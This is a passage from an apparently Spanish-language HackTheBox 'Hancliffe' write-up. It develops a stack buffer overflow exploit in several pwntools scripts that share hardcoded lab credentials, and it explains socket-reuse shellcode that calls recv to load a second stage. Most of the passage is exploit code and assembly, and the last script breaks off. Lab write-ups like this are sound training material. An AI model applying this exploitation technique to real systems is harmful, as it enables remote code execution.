+    <span class=mtk1>r</span> <span class=mtk5>=</span> <span class="mtk8 mtku">remote</span><span class=mtk1>(</span><span class=mtk1>ip</span><span class=mtk1>,</span> <span class=mtk1>port</span><span class=mtk1>)</span>
+
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Username:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>username</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Password:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>password</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'FullName:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>fullname</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Input</span> <span class=mtk4>Your</span> <span class=mtk4>Code:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>payload</span><span class=mtk1>)</span>  
+
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>close</span><span class=mtk1>()</span>
+
+
+<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>'__main__'</span><span class=mtk1>:</span>
+    <span class=mtk8>main</span><span class=mtk1>()</span>
+</code></pre></div><p><img src=/images/HTB/Hancliffe/Hancliffe-captureC.png alt=EIP></p><p>Aquí vemos que el programa se ha parado en la primera instrucción de <em>breakpoint</em>, por lo que vamos bien. El siguiente paso será saltar hacia atrás en la pila donde tenemos las <code>A</code>s. La idea es añadir instrucciones ahí para ejecutar código arbitrario. La longitud del salto es 56 (52 del <em>offset</em> y 4 de la dirección sobrescrita). Este es <code>exploitD.py</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>
+
+<span class=mtk5>from</span> <span class="mtk8 mtku">pwn</span> <span class=mtk5>import</span> <span class=mtk5>*</span>
+
+
+<span class="mtk7 mtki">def</span> <span class=mtk8>main</span><span class=mtk1>():</span>
+    <span class=mtk1>ip</span><span class=mtk1>,</span> <span class=mtk1>port</span> <span class=mtk5>=</span> <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>],</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>2</span><span class=mtk1>])</span>
+
+    <span class=mtk1>username</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'alfiansyah'</span>
+    <span class=mtk1>password</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'K3r4j@@nM4j@pAh!T'</span>
+    <span class=mtk1>fullname</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'Vickry</span> <span class=mtk4>Alfiansyah'</span>
+    <span class=mtk1>code</span>     <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'T3D83CbJkl1299'</span>
+
+    <span class=mtk1>offset</span>   <span class=mtk5>=</span> <span class=mtk6>52</span>
+    <span class=mtk1>jmp_esp</span>  <span class=mtk5>=</span> <span class=mtk1>p32(</span><span class="mtk7 mtki">0x</span><span class=mtk6>7190239f</span><span class=mtk1>)</span>
+    <span class=mtk1>jmp_back</span> <span class=mtk5>=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'jmp</span> <span class=mtk4>$-56'</span><span class=mtk1>)</span>
+
+    <span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>code</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\xcc</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk1>offset</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>jmp_esp</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>jmp_back</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\xcc</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk6>8</span>
+
+    <span class=mtk1>r</span> <span class=mtk5>=</span> <span class="mtk8 mtku">remote</span><span class=mtk1>(</span><span class=mtk1>ip</span><span class=mtk1>,</span> <span class=mtk1>port</span><span class=mtk1>)</span>
+
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Username:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>username</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Password:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>password</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'FullName:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>fullname</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Input</span> <span class=mtk4>Your</span> <span class=mtk4>Code:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>payload</span><span class=mtk1>)</span>  
+
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>close</span><span class=mtk1>()</span>
+
+
+<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>'__main__'</span><span class=mtk1>:</span>
+    <span class=mtk8>main</span><span class=mtk1>()</span>
+</code></pre></div><p><img src=/images/HTB/Hancliffe/Hancliffe-captureD.png alt=EIP></p><p>Genial, ahora estamos parados en el primer <em>breakpoint</em> del área de relleno. Este gráfico puede ayudar a entender la estrategia de explotación:</p><p><img src=/images/HTB/Hancliffe/stack-es.png alt=EIP></p><p>Tenemos 52 bytes para escribir <em>shellcode</em> personalizado (el área de color rojo). Como dijimos antes, no hay ningún <em>shellcode</em> común que entre en 52 bytes, por lo que utilizaremos una técnica llamada <em>Socket Reuse</em> (puedes leer este <a href=https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/>write-up</a> de <code>vulnserver.exe</code> para más información).</p><p>Vamos a llamar a <code>recv</code> para leer datos adicionales desde la conexión del <em>socket</em> y escribirlos en la pila (<em>stack</em>), de forma que ya no tengamos la limitación del <em>buffer</em>. Para este propósito, 52 bytes son más que suficientes.</p><p>Para llamar a <code>recv</code> necesitamos configurar los argumentos correctamente (más información <a href=https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv>aquí</a>):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">int</span> <span class=mtk8>recv</span><span class=mtk1>(</span><span class="mtk8 mtku">SOCKET</span> <span class="mtk9 mtki">s</span><span class=mtk1>,</span> <span class="mtk7 mtki">char</span><span class=mtk5>*</span> <span class="mtk9 mtki">buf</span><span class=mtk1>,</span> <span class="mtk7 mtki">int</span> <span class="mtk9 mtki">len</span><span class=mtk1>,</span> <span class="mtk7 mtki">int</span> <span class="mtk9 mtki">flags</span><span class=mtk1>);</span>  
+</code></pre></div><ul>
+<li><code>s</code> es el descriptor de archivo de la conexión del <em>socket</em> (cambia cada vez que el programa se reinicia).</li><li><code>buf</code> es la dirección del espacio de memoria donde escribir los datos recibidos.</li><li><code>len</code> es la longitud máxima que se espera leer.</li><li><code>flags</code> añaden alguna configuración (normalmente estará a <code>0</code>).</li></ul><p>La primera tarea que tenemos que realizar es averiguar dónde se guarda el descriptor de archivo del <em>socket</em>. Para eso, vamos a poner un <em>breakpoint</em> en una llamada a <code>recv</code> para ver sus argumentos:</p><p><img src=/images/HTB/Hancliffe/Hancliffe-captureE0.png alt=EIP></p><p>Ahora podemos ejecutar el <em>exploit</em> y ver que el programa se para en <code>recv</code>:</p><p><img src=/images/HTB/Hancliffe/Hancliffe-captureE1.png alt=EIP></p><p>El descriptor de archivo del <em>socket</em> es <code>0x13c</code>, y está en la dirección <code>0x0101ff18</code>.</p><p>Además, vemos que <code>0x13c</code> se toma de <code>$ebp - 0x10</code> y se guarda en <code>$eax</code>, y luego el valor de <code>$eax</code> se sube a la pila. Por tanto, <code>0x13c</code> también se puede encontrar en <code>0x0101ff60</code> (<code>$ebp - 0x10</code>).</p><p>Podemos guardar el valor del descriptor de archivo del <em>socket</em> en <code>$eax</code> mediante las siguientes instrucciones en ensamblador:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk8>add</span>  <span class=mtk7>esp</span>, <span class=mtk6>0x48</span>           <span class=mtk3># 83 c4 48</span>  
+<span class=mtk8>pop</span>  <span class=mtk7>eax</span>                 <span class=mtk3># 58</span>
+<span class=mtk8>push</span> <span class=mtk7>eax</span>                 <span class=mtk3># 50</span>
+<span class=mtk8>sub</span>  <span class=mtk7>esp</span>, <span class=mtk6>0x48</span>           <span class=mtk3># 83 ec 48</span>
+</code></pre></div><p>Nótese que añadimos <code>0x48</code> al puntero de pila porque <code>0x0101ff60 - 0x0101ff18 = 0x48</code>, y además volvemos a subir a la pila para dejarla como estaba. Vamos a ver si funciona con <code>exploitE.py</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>
+
+<span class=mtk5>from</span> <span class="mtk8 mtku">pwn</span> <span class=mtk5>import</span> <span class=mtk5>*</span>
+
+
+<span class="mtk7 mtki">def</span> <span class=mtk8>main</span><span class=mtk1>():</span>
+    <span class=mtk1>ip</span><span class=mtk1>,</span> <span class=mtk1>port</span> <span class=mtk5>=</span> <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>],</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>2</span><span class=mtk1>])</span>
+
+    <span class=mtk1>username</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'alfiansyah'</span>
+    <span class=mtk1>password</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'K3r4j@@nM4j@pAh!T'</span>
+    <span class=mtk1>fullname</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'Vickry</span> <span class=mtk4>Alfiansyah'</span>
+    <span class=mtk1>code</span>     <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'T3D83CbJkl1299'</span>
+
+    <span class=mtk1>offset</span>   <span class=mtk5>=</span> <span class=mtk6>52</span>
+    <span class=mtk1>jmp_esp</span>  <span class=mtk5>=</span> <span class=mtk1>p32(</span><span class="mtk7 mtki">0x</span><span class=mtk6>7190239f</span><span class=mtk1>)</span>
+    <span class=mtk1>jmp_back</span> <span class=mtk5>=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'jmp</span> <span class=mtk4>$-56'</span><span class=mtk1>)</span>
+
+    <span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>code</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'add</span>  <span class=mtk4>esp,</span> <span class=mtk4>0x48'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'pop</span>  <span class=mtk4>eax'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'push</span> <span class=mtk4>eax'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'sub</span>  <span class=mtk4>esp,</span> <span class=mtk4>0x48'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\xcc</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk1>(</span><span class=mtk1>offset</span> <span class=mtk5>+</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class=mtk1>code</span><span class=mtk1>)</span> <span class=mtk5>-</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class=mtk1>payload</span><span class=mtk1>))</span>  
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>jmp_esp</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>jmp_back</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\xcc</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk6>8</span>
+
+    <span class=mtk1>r</span> <span class=mtk5>=</span> <span class="mtk8 mtku">remote</span><span class=mtk1>(</span><span class=mtk1>ip</span><span class=mtk1>,</span> <span class=mtk1>port</span><span class=mtk1>)</span>
+
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Username:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>username</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Password:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>password</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'FullName:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>fullname</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Input</span> <span class=mtk4>Your</span> <span class=mtk4>Code:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>payload</span><span class=mtk1>)</span>
+
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>close</span><span class=mtk1>()</span>
+
+
+<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>'__main__'</span><span class=mtk1>:</span>
+    <span class=mtk8>main</span><span class=mtk1>()</span>
+</code></pre></div><p><img src=/images/HTB/Hancliffe/Hancliffe-captureE2.png alt=EIP></p><p>Perfecto, todo va bien.</p><p>Sin embargo, tendremos un problema que solventar. Si continuamos escribiendo instrucciones, acabaremos por sobrescribirnos a nosotros mismos porque utilizamos la pila. Por tanto, necesitamos disminuir el valor del puntero de pila, por ejemplo <code>0x64</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk8>sub</span>  <span class=mtk7>esp</span>, <span class=mtk6>0x64</span>           <span class=mtk3># 83 ec 64</span>  
+</code></pre></div><p>Ahora preparamos la llamada a <code>recv</code>. Para ello, tenemos que añadir los argumentos a la pila en sentido inverso (es decir, <code>flags</code>, <code>len</code>, <code>buf</code>, <code>s</code> y luego usar la instrucción <code>call</code>) debido a la convención de llamadas a funciones en x86.</p><p>El parámetro <code>flags</code> tendrá un valor de <code>0</code>. Como los bytes nulos son <em>bad characters</em> (ya que la función vulnerable es <code>strcpy</code> y los bytes nulos terminan las cadenas de caracteres en C), tendremos que subir un <code>0</code> utilizando una instrucción <code>xor</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk8>xor</span>  <span class=mtk7>ebx</span>, <span class=mtk7>ebx</span>            <span class=mtk3># 31 db</span>  
+<span class=mtk8>push</span> <span class=mtk7>ebx</span>                 <span class=mtk3># 53</span>
+</code></pre></div><p>El siguiente parámetro es <code>len</code>, que tendrá un valor de <code>0x400</code> (esto es 1024 bytes de espacio para escribir). De nuevo, para evitar los bytes nulos, podemos escribir un simple <code>0x4</code> en <code>$bh</code> y subir <code>$ebx</code> a la pila:</p><p><img src=/images/HTB/Hancliffe/x86-registers.png alt="image registers"></p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk8>add</span>   <span class=mtk7>bh</span>, <span class=mtk6>0x4</span>            <span class=mtk3># 80 c7 04</span>  
+<span class=mtk8>push</span> <span class=mtk7>ebx</span>                 <span class=mtk3># 53</span>
+</code></pre></div><p>El próximo paso es guardar la dirección donde queremos que los datos sean escritos. Usaremos un cierto <em>offset</em> desde el puntero de la pila para ello:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk8>mov</span>  <span class=mtk7>ebx</span>, <span class=mtk7>esp</span>            <span class=mtk3># 89 e3</span>
+<span class=mtk8>add</span>  <span class=mtk7>ebx</span>, <span class=mtk6>0x64</span>           <span class=mtk3># 83 c3 64</span>  
+<span class=mtk8>push</span> <span class=mtk7>ebx</span>                 <span class=mtk3># 53</span>
+</code></pre></div><p>Finalmente, añadimos el descriptor de archivo del <em>socket</em>, que estaba guardado en <code>$eax</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk8>push</span> <span class=mtk7>eax</span>                 <span class=mtk3># 50</span>  
+</code></pre></div><p>Vamos a escribir <code>exploitF.py</code> para ver si todos los argumentos están correctamente configurados antes de llamar a <code>recv</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>
+
+<span class=mtk5>from</span> <span class="mtk8 mtku">pwn</span> <span class=mtk5>import</span> <span class=mtk5>*</span>
+
+
+<span class="mtk7 mtki">def</span> <span class=mtk8>main</span><span class=mtk1>():</span>
+    <span class=mtk1>ip</span><span class=mtk1>,</span> <span class=mtk1>port</span> <span class=mtk5>=</span> <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>],</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>2</span><span class=mtk1>])</span>
+
+    <span class=mtk1>username</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'alfiansyah'</span>
+    <span class=mtk1>password</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'K3r4j@@nM4j@pAh!T'</span>
+    <span class=mtk1>fullname</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'Vickry</span> <span class=mtk4>Alfiansyah'</span>
+    <span class=mtk1>code</span>     <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'T3D83CbJkl1299'</span>
+
+    <span class=mtk1>offset</span>   <span class=mtk5>=</span> <span class=mtk6>52</span>
+    <span class=mtk1>jmp_esp</span>  <span class=mtk5>=</span> <span class=mtk1>p32(</span><span class="mtk7 mtki">0x</span><span class=mtk6>7190239f</span><span class=mtk1>)</span>
+    <span class=mtk1>jmp_back</span> <span class=mtk5>=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'jmp</span> <span class=mtk4>$-56'</span><span class=mtk1>)</span>
+
+    <span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>code</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'add</span>  <span class=mtk4>esp,</span> <span class=mtk4>0x48'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'pop</span>  <span class=mtk4>eax'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'push</span> <span class=mtk4>eax'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'sub</span>  <span class=mtk4>esp,</span> <span class=mtk4>0x48'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'sub</span>  <span class=mtk4>esp,</span> <span class=mtk4>0x64'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'xor</span>  <span class=mtk4>ebx,</span>  <span class=mtk4>ebx'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'push</span> <span class=mtk4>ebx'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'add</span>   <span class=mtk4>bh,</span> <span class=mtk4>0x04'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'push</span> <span class=mtk4>ebx'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'mov</span>  <span class=mtk4>ebx,</span>  <span class=mtk4>esp'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'add</span>  <span class=mtk4>ebx,</span> <span class=mtk4>0x64'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'push</span> <span class=mtk4>ebx'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'push</span> <span class=mtk4>eax'</span><span class=mtk1>)</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\xcc</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk1>(</span><span class=mtk1>offset</span> <span class=mtk5>+</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class=mtk1>code</span><span class=mtk1>)</span> <span class=mtk5>-</span> <span class=mtk8>len</span><span class=mtk1>(</span><span class=mtk1>payload</span><span class=mtk1>))</span>  
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>jmp_esp</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class=mtk1>jmp_back</span>
+    <span class=mtk1>payload</span> <span class=mtk5>+=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'</span><span class=mtk6>\xcc</span><span class=mtk4>'</span> <span class=mtk5>*</span> <span class=mtk6>8</span>
+
+    <span class=mtk1>r</span> <span class=mtk5>=</span> <span class="mtk8 mtku">remote</span><span class=mtk1>(</span><span class=mtk1>ip</span><span class=mtk1>,</span> <span class=mtk1>port</span><span class=mtk1>)</span>
+
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Username:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>username</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Password:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>password</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'FullName:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>fullname</span><span class=mtk1>)</span>
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Input</span> <span class=mtk4>Your</span> <span class=mtk4>Code:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>payload</span><span class=mtk1>)</span>
+
+    <span class=mtk1>r</span><span class=mtk1>.</span><span class=mtk8>close</span><span class=mtk1>()</span>
+
+
+<span class=mtk5>if</span> <span class=mtk1>__name__</span> <span class=mtk5>==</span> <span class=mtk4>'__main__'</span><span class=mtk1>:</span>
+    <span class=mtk8>main</span><span class=mtk1>()</span>
+</code></pre></div><p><img src=/images/HTB/Hancliffe/Hancliffe-captureF.png alt=EIP></p><p>Ahora podemos llamar a <code>recv</code>, cuya dirección en el binario es <code>0x719082ac</code> (aparece en la captura de pantalla con el <em>breakpoint</em>). Entonces podemos utilizar unas instrucciones como estas:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk8>mov</span>  <span class=mtk7>eax</span>, <span class=mtk7>ds</span>:<span class=mtk6>0x719082ac</span>  <span class=mtk3># a1 ac 82 90 71</span>  
+<span class=mtk8>call</span> <span class=mtk7>eax</span>                 <span class=mtk3># ff d0</span>
+</code></pre></div><p>Añadí instrucciones de <em>breakpoint</em> para ver si el <em>socket</em> recibía y ejecutaba el segundo <em>payload</em>. También cambié las instrucciones de <em>breakpoint</em> del primer <em>payload</em> y puse instruciones <code>nop</code> (<code>\x90</code>).</p><p>Este es <code>exploitG.py</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>
+
+<span class=mtk5>from</span> <span class="mtk8 mtku">pwn</span> <span class=mtk5>import</span> <span class=mtk5>*</span>
+
+
+<span class="mtk7 mtki">def</span> <span class=mtk8>main</span><span class=mtk1>():</span>
+    <span class=mtk1>ip</span><span class=mtk1>,</span> <span class=mtk1>port</span> <span class=mtk5>=</span> <span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>],</span> <span class="mtk8 mtku">int</span><span class=mtk1>(</span><span class="mtk8 mtku">sys</span><span class=mtk1>.</span><span class=mtk1>argv</span><span class=mtk1>[</span><span class=mtk6>2</span><span class=mtk1>])</span>
+
+    <span class=mtk1>username</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'alfiansyah'</span>
+    <span class=mtk1>password</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'K3r4j@@nM4j@pAh!T'</span>
+    <span class=mtk1>fullname</span> <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'Vickry</span> <span class=mtk4>Alfiansyah'</span>
+    <span class=mtk1>code</span>     <span class=mtk5>=</span> <span class="mtk7 mtki">b</span><span class=mtk4>'T3D83CbJkl1299'</span>
+
+    <span class=mtk1>offset</span>   <span class=mtk5>=</span> <span class=mtk6>52</span>
+    <span class=mtk1>jmp_esp</span>  <span class=mtk5>=</span> <span class=mtk1>p32(</span><span class="mtk7 mtki">0x</span><span class=mtk6>7190239f</span><span class=mtk1>)</span>
+    <span class=mtk1>jmp_back</span> <span class=mtk5>=</span> <span class=mtk8>asm</span><span class=mtk1>(</span><span class=mtk4>'jmp</span> <span class=mtk4>$-56'</span><span class=mtk1>)</span>
+
+    <span class=mtk1>payload</span>  <span class=mtk5>=</span> <span class=mtk1>code</span>
